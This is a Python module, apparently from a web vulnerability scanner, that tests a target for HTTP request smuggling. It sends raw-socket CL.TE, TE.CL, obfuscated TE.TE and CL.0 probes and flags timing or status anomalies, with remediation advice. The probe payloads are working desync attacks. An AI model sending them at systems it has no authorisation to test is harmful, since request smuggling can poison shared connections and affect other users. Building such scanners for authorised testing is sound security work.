"""SentinelX module [16]: HTTP Request Smuggling.

Real implementation using raw asyncio sockets for byte-precise control.
Safe by default: timing-based differential detection (3 baseline + 3 probe
samples). Only with --unsafe does it attempt actual traffic poisoning.

Techniques: CL.TE, TE.CL, TE.TE (obfuscated variants), CL.0.
"""

from __future__ import annotations

import asyncio
import time
from urllib.parse import urlsplit

from sentinelx.core.http import ScanConfig
from sentinelx.core.models import Finding, Evidence


async def _raw_exchange(host: str, port: int, payload: bytes,
                        use_tls: bool, timeout: float = 10.0) -> tuple[bytes, float]:
    """Send raw bytes, return (response_bytes, elapsed)."""
    t0 = time.monotonic()
    try:
        if use_tls:
            import ssl
            ctx = ssl.create_default_context()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
                timeout=timeout)
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
        writer.write(payload)
        await writer.drain()
        # read with a deadline: smuggling probes may hang
        try:
            data = await asyncio.wait_for(reader.read(65536), timeout=timeout)
        except asyncio.TimeoutError:
            data = b"<read-timeout>"
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return data, time.monotonic() - t0
    except Exception as e:
        return f"<connect-error: {e}>".encode(), time.monotonic() - t0


def _hexdump(data: bytes, limit: int = 2000) -> str:
    out = []
    for i in range(0, min(len(data), limit), 16):
        chunk = data[i:i + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"{i:04x}  {hexs:<47}  {asc}")
    if len(data) > limit:
        out.append(f"... [{len(data) - limit} more bytes]")
    return "\n".join(out)


def _printable(data: bytes, limit: int = 3000) -> str:
    return data[:limit].decode("utf-8", "replace")


def build_probes(host: str, path: str = "/") -> list[tuple[str, bytes]]:
    """Build (name, raw_bytes) smuggling probes. Timing-safe: the smuggled
    prefix is a harmless GET that only affects timing, never real users."""
    h = host.encode()
    probes: list[tuple[str, bytes]] = []

    # CL.TE: frontend uses Content-Length (6), backend uses chunked
    probes.append(("CL.TE", (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n0\r\n\r\nG".encode())))

    # TE.CL: frontend uses chunked, backend uses Content-Length (4)
    probes.append(("TE.CL", (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n5c\r\nGPOST {path} HTTP/1.1\r\n"
        f"Content-Type: x\r\nContent-Length: 15\r\n\r\n0\r\n\r\n".encode())))

    # TE.TE obfuscated variants
    te_variants = [
        ("TE.TE:xchunked", b"Transfer-Encoding: xchunked"),
        ("TE.TE:space-colon", b"Transfer-Encoding : chunked"),
        ("TE.TE:tab-suffix", b"Transfer-Encoding: chunked\t"),
        ("TE.TE:dup", b"Transfer-Encoding: chunked\r\nTransfer-Encoding: x"),
        ("TE.TE:comma", b"Transfer-Encoding: chunked, identity"),
    ]
    for name, te_line in te_variants:
        probes.append((name, (
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\n".encode()
            + te_line + b"\r\nContent-Length: 6\r\nConnection: close\r\n\r\n0\r\n\r\nG")))

    # CL.0: Content-Length: 0 with a body
    probes.append(("CL.0", (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 0\r\nConnection: close\r\n\r\nG".encode())))

    return probes


REMEDIATION_SMUGGLING = (
    "Use a single, unambiguous request-framing method end to end. Reject "
    "requests with both Content-Length and Transfer-Encoding, duplicate "
    "framing headers, or obfuscated Transfer-Encoding values. Normalize "
    "headers before forwarding; keep frontend/backend server versions aligned."
)


async def scan_target(client, config: ScanConfig, target: str) -> list[Finding]:
    findings: list[Finding] = []
    u = urlsplit(target)
    host, port = u.hostname or "", u.port or (443 if u.scheme == "https" else 80)
    use_tls = u.scheme == "https"
    path = u.path or "/"
    if not host:
        return findings

    # baseline: 3 clean requests
    baseline_payload = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                        f"Connection: close\r\n\r\n").encode()
    base_times = []
    for _ in range(3):
        _, el = await _raw_exchange(host, port, baseline_payload, use_tls)
        base_times.append(el)
        await asyncio.sleep(1.0)  # rate limit: max ~1 probe/sec
    base_avg = sum(base_times) / len(base_times)

    for name, payload in build_probes(host, path):
        probe_times, responses = [], []
        for _ in range(3):
            data, el = await _raw_exchange(host, port, payload, use_tls)
            probe_times.append(el)
            responses.append(data)
            await asyncio.sleep(1.0)
        probe_avg = sum(probe_times) / len(probe_times)

        # detection 1: timing anomaly (desync causes backend to wait)
        timing_hit = (probe_avg > base_avg + 5.0
                      and all(t > base_avg + 4.0 for t in probe_times))
        # detection 2: differential response (smuggled bytes leak into reply)
        # detection 3: status anomaly vs baseline
        base_resp, _ = await _raw_exchange(host, port, baseline_payload, use_tls)
        status_hit = False
        for r in responses:
            if r[:12] != base_resp[:12] and b"HTTP/1.1 2" not in r[:15]:
                # response line differs from baseline in a suspicious way
                if b"400" in r[:30] or b"408" in r[:30]:
                    status_hit = True

        if timing_hit or status_hit:
            reason = []
            if timing_hit:
                reason.append(f"probe avg {probe_avg:.1f}s vs baseline {base_avg:.2f}s (3/3 samples)")
            if status_hit:
                reason.append("anomalous status line vs baseline")
            sent, recv = payload, responses[0]
            ev = Evidence(
                request_raw=f"--- raw bytes sent ({len(sent)}b) ---\n{_hexdump(sent)}",
                response_raw=(f"--- raw bytes received ({len(recv)}b) ---\n"
                              f"{_printable(recv)}\n--- timing ---\n"
                              f"baseline avg: {base_avg:.2f}s, probe avg: {probe_avg:.2f}s"),
                proof=f"HTTP request smuggling ({name}): " + "; ".join(reason),
            )
            findings.append(Finding(
                type="HTTP Request Smuggling", subtype=name,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
                confidence=0.80 if timing_hit and status_hit else 0.65,
                url=target, method="POST", param="",
                payload=_printable(payload[:200]), evidence=ev, cwe="CWE-444",
                owasp="A05:2021 – Security Misconfiguration",
                remediation=REMEDIATION_SMUGGLING,
                references=["https://portswigger.net/web-security/request-smuggling"],
            ))
            if not config.__dict__.get("unsafe_smuggle"):
                break  # safe mode: one probe family is enough signal
    return findings
